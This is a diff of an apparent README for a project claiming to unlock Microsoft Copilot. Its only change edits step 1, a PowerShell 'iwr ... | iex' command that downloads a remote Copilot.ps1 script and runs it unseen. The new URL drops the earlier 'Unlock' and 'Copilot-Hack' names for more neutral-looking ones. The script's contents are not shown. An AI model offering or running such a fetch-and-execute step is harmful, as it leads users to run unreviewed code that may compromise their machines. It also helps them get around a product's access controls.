@@ -11,7 +11,7 @@
 
 1. Run the following command in a PowerShell prompt:
 
-`iwr -useb https://github.com/Mr-Zanzibar/Microsoft-CopilotAI-Unlock/releases/download/Copilot-Hack/Copilot.ps1 | iex`
+`iwr -useb https://github.com/Mr-Zanzibar/Microsoft-CopilotAI/releases/download/CopilotAI/Copilot.ps1 | iex`
 
 2. Everything will be automatic.
 
